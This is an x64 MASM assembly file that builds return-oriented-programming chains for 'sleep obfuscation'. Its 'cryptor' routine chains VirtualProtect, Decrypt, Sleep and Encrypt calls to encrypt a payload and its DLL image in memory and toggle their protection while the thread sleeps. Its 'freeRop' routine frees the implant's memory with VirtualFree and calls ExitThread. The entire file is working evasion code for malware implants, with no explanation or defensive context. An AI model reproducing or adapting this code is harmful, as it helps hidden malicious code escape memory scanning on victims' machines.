cryptor proto
freeRop proto

.data
Config STRUCT
	gadget DQ 1
	gadgetPad DQ 1

	OldSleep DQ 1
	dwMiliseconds DQ 1

	Encrypt DQ 1
	Decrypt DQ 1

	encLocation DQ 1
	encLocationSize DQ 1

	VirtualProtect DQ 1
	OldProtect DQ 1

	Key DQ 1
	PayloadBuffer DQ 1
	EncryptBuffer DQ 1

	BaseAddress DQ 1
	DLLSize DQ 1

	VirtualFree DQ 1
	ExitThread DQ 1
	FreeType DQ 1
	ThreadHandle DQ 1
Config ENDS
.code

; Arguments Go Here
;		   RCX		  RDX			  R8						 R9				 Stack+28	   Stack+30
cryptor proc
	push qword ptr [rcx + Config.VirtualProtect]
	push 0000000000000000h
	push 0000000000000000h
	push qword ptr [rcx + Config.OldProtect]
	push 0000000000000040h
	push qword ptr [rcx + Config.encLocation]
	push qword ptr [rcx + Config.encLocationSize]
	push qword ptr [rcx + Config.gadget]

	push 0000000000000000h
	push 0000000000000000h
	push 0000000000000000h
	push 0000000000000000h
	push qword ptr [rcx + Config.gadgetPad]

	push qword ptr [rcx + Config.Decrypt]
	push 0000000000000000h
	push 0000000000000000h
	push 0000000000000000h
	push 0000000000000000h
	push qword ptr [rcx + Config.PayloadBuffer]
	push qword ptr [rcx + Config.Key]
	push qword ptr [rcx + Config.gadget]

	push 0000000000000000h
	push 0000000000000000h
	push 0000000000000000h
	push 0000000000000000h
	push qword ptr [rcx + Config.gadgetPad]

	push qword ptr [rcx + Config.VirtualProtect]
	push 0000000000000000h
	push 0000000000000000h
	push qword ptr [rcx + Config.OldProtect]
	push 0000000000000040h
	push qword ptr [rcx + Config.BaseAddress]
	push qword ptr [rcx + Config.DLLSize]
	push qword ptr [rcx + Config.gadget]

	push 0000000000000000h
	push 0000000000000000h
	push 0000000000000000h
	push 0000000000000000h
	push qword ptr [rcx + Config.gadgetPad]

	push qword ptr [rcx + Config.Decrypt]
	push 0000000000000000h
	push 0000000000000000h
	push 0000000000000000h
	push 0000000000000000h
	push qword ptr [rcx + Config.EncryptBuffer]
	push qword ptr [rcx + Config.Key]
	push qword ptr [rcx + Config.gadget]

	push 0000000000000000h
	push 0000000000000000h
	push 0000000000000000h
	push 0000000000000000h
	push qword ptr [rcx + Config.gadgetPad]

	push qword ptr [rcx + Config.OldSleep]
	push 0000000000000000h
	push 0000000000000000h
	push 0000000000000000h
	push 0000000000000000h
	push qword ptr [rcx + Config.dwMiliseconds]
	push 0000000000000000h
	push qword ptr [rcx + Config.gadget]

	push 0000000000000000h
	push 0000000000000000h
	push 0000000000000000h
	push 0000000000000000h
	push qword ptr [rcx + Config.gadgetPad]

	push qword ptr [rcx + Config.Encrypt]
	push 0000000000000000h
	push 0000000000000000h
	push 0000000000000000h
	push 0000000000000000h
	push qword ptr [rcx + Config.EncryptBuffer]
	push qword ptr [rcx + Config.Key]
	push qword ptr [rcx + Config.gadget]

	push 0000000000000000h
	push 0000000000000000h
	push 0000000000000000h
	push 0000000000000000h
	push qword ptr [rcx + Config.gadgetPad]

	push qword ptr [rcx + Config.VirtualProtect]
	push 0000000000000000h
	push 0000000000000000h
	push qword ptr [rcx + Config.OldProtect]
	push 0000000000000004h
	push qword ptr [rcx + Config.BaseAddress]
	push qword ptr [rcx + Config.DLLSize]
	push qword ptr [rcx + Config.gadget]

	push 0000000000000000h
	push 0000000000000000h
	push 0000000000000000h
	push 0000000000000000h
	push qword ptr [rcx + Config.gadgetPad]

	push qword ptr [rcx + Config.Encrypt]
	push 0000000000000000h
	push 0000000000000000h
	push 0000000000000000h
	push 0000000000000000h
	push qword ptr [rcx + Config.PayloadBuffer]
	push qword ptr [rcx + Config.Key]
	push qword ptr [rcx + Config.gadget]

	push 0000000000000000h
	push 0000000000000000h
	push 0000000000000000h
	push 0000000000000000h
	push qword ptr [rcx + Config.gadgetPad]

	push qword ptr [rcx + Config.VirtualProtect]
	push 0000000000000000h
	push 0000000000000000h
	push qword ptr [rcx + Config.OldProtect]
	push 0000000000000004h
	push qword ptr [rcx + Config.encLocation]
	push qword ptr [rcx + Config.encLocationSize]
	push qword ptr [rcx + Config.gadget]
	ret ; gadget lives in rcx
cryptor endp

freeRop proc
	push qword ptr [rcx + Config.ExitThread]
	push 0000000000000000h
	push 0000000000000000h
	push 0000000000000000h
	push 0000000000000000h
	push qword ptr [rcx + Config.ThreadHandle]
	push 0000000000000000h
	push qword ptr [rcx + Config.gadget]

	push 0000000000000000h
	push 0000000000000000h
	push 0000000000000000h
	push 0000000000000000h
	push 0000000000000000h
	push 0000000000000000h
	push qword ptr [rcx + Config.gadget]

	push qword ptr [rcx + Config.VirtualFree]
	push 0000000000000000h
	push 0000000000000000h
	push 0000000000000000h
	push qword ptr [rcx + Config.FreeType]
	push qword ptr [rcx + Config.gadgetPad]
	push 0000000000000000h
	push qword ptr [rcx + Config.gadget]

	push 0000000000000000h
	push 0000000000000000h
	push 0000000000000000h
	push 0000000000000000h
	push 0000000000000000h
	push 0000000000000000h
	push qword ptr [rcx + Config.gadget]

	push qword ptr [rcx + Config.VirtualFree]
	push 0000000000000000h
	push 0000000000000000h
	push 0000000000000000h
	push qword ptr [rcx + Config.FreeType]
	push qword ptr [rcx + Config.BaseAddress]
	push 0000000000000000h
	push qword ptr [rcx + Config.gadget]

	push 0000000000000000h
	push 0000000000000000h
	push 0000000000000000h
	push 0000000000000000h
	push 0000000000000000h
	push 0000000000000000h
	push qword ptr [rcx + Config.gadget]

	push qword ptr [rcx + Config.VirtualFree]
	push 0000000000000000h
	push 0000000000000000h
	push 0000000000000000h
	push qword ptr [rcx + Config.FreeType]
	push qword ptr [rcx + Config.encLocation]
	push 0000000000000000h
	push qword ptr [rcx + Config.gadget]
	ret ; gadget lives in rcx
freeRop endp

end